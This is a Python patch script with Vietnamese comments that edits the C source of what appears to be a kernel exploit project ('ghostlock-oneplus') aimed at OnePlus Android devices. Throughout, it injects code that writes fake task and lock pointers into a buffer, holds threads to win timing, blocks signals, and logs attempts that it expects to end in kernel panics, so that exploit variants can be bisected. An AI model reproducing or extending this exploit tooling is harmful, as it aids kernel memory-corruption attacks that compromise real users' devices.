#!/usr/bin/env python3
"""patch_ssopt_envs.py  — gom lựa chọn bisect thành ENV (không phải build lại)

  SSOPT_SCAN=1        : paint marker (như kp41)  -> panic cho x24 = slot của lock
  SSOPT_BASELINE=1    : paint len=0x50, chỉ task@0x40 + lock@0x48 (không prio,
                        không tree_entry) = đúng bản ghostlock53/54 đã "trúng"
  SSOPT_HOLD=0/1      : 1 (mặc định) = block trong kernel bằng select(64);
                        0 = spin-park ngoài userspace (như bản cũ)
  SSOPT_QUIET_EXIT=0/1: 1 (mặc định) = chặn signal + flush task_work trước paint
  SSOPT_OWNER0=0/1    : (util.c) page FOPS owner=0 + W0.prio=100; 0 = như cũ
                        (owner=fake_task|1, W0.prio=140)
Mục đích: giữ nguyên tooling (fsync log, peek) và bisect từ baseline.
"""
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()

# 1) baseline paint branch (sau SCAN/SCAN2/RANGE, trước branch triple)
old = """    } else if (ssopt_write_pc && ssopt_write_right && !ssopt_write_left) {"""
new = """    } else if (env_flag("SSOPT_BASELINE", 0)) {
      /* Baseline = bản ghostlock53/54: chỉ task@buf[0x40], lock@buf[0x48],
       * KHÔNG sơn prio (buf[0x50]) và KHÔNG sơn tree_entry; len=0x50. */
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
    } else if (ssopt_write_pc && ssopt_write_right && !ssopt_write_left) {"""
assert s.count(old) == 1, ("baseline branch", s.count(old))
s = s.replace(old, new, 1)

# 2) paint_len theo BASELINE
old = """    socklen_t paint_len = 0x60;"""
new = """    socklen_t paint_len = env_flag("SSOPT_BASELINE", 0) ? 0x50 : 0x60;"""
assert s.count(old) == 1, ("paint_len", s.count(old))
s = s.replace(old, new, 1)

# 3) quiet-exit -> env
old = """    {
      static int ssopt_exit_quiet;
      if (!ssopt_exit_quiet) {
        sigset_t all;
        sigfillset(&all);
        pthread_sigmask(SIG_BLOCK, &all, NULL);
        ssopt_exit_quiet = 1;
      }
      (void)syscall(SYS_getpid);
    }"""
new = """    if (env_flag("SSOPT_QUIET_EXIT", 1)) {
      static int ssopt_exit_quiet;
      if (!ssopt_exit_quiet) {
        sigset_t all;
        sigfillset(&all);
        pthread_sigmask(SIG_BLOCK, &all, NULL);
        ssopt_exit_quiet = 1;
      }
      (void)syscall(SYS_getpid);
    }"""
assert s.count(old) == 1, ("quiet env", s.count(old))
s = s.replace(old, new, 1)

# 4) hold -> env; spin bound theo hold
old = """    if (ssopt_hold_r >= 0 && ssopt_hold_r < 64) {
      fd_set h_in, h_out, h_ex;
      FD_ZERO(&h_in); FD_ZERO(&h_out); FD_ZERO(&h_ex);
      FD_SET(ssopt_hold_r, &h_in);          /* empty pipe: never ready */
      struct timeval h_tv = { .tv_sec = 1, .tv_usec = 0 };
      select(64, &h_in, &h_out, &h_ex, &h_tv);
    }
    for (int spin = 0;
         spin < 100000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }"""
new = """    if (env_flag("SSOPT_HOLD", 1) && ssopt_hold_r >= 0 && ssopt_hold_r < 64) {
      fd_set h_in, h_out, h_ex;
      FD_ZERO(&h_in); FD_ZERO(&h_out); FD_ZERO(&h_ex);
      FD_SET(ssopt_hold_r, &h_in);          /* empty pipe: never ready */
      struct timeval h_tv = { .tv_sec = 1, .tv_usec = 0 };
      select(64, &h_in, &h_out, &h_ex, &h_tv);
    }
    for (int spin = 0;
         spin < (env_flag("SSOPT_HOLD", 1) ? 100000000 : 2000000000) &&
           !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }"""
assert s.count(old) == 1, ("hold env", s.count(old))
s = s.replace(old, new, 1)

# 5) log the effective settings once per attempt
old = """    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu\\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf);
    fsync(1);   /* panic loses the page cache: force the log to disk */"""
new = """    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu "
            "scan=%d baseline=%d hold=%d quiet=%d owner0=%d\\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf,
            env_flag("SSOPT_SCAN", 0), env_flag("SSOPT_BASELINE", 0),
            env_flag("SSOPT_HOLD", 1), env_flag("SSOPT_QUIET_EXIT", 1),
            env_flag("SSOPT_OWNER0", 1));
    fsync(1);   /* panic loses the page cache: force the log to disk */"""
assert s.count(old) == 1, ("pre paint log", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: env gates SSOPT_BASELINE / SSOPT_HOLD / SSOPT_QUIET_EXIT + settings log")
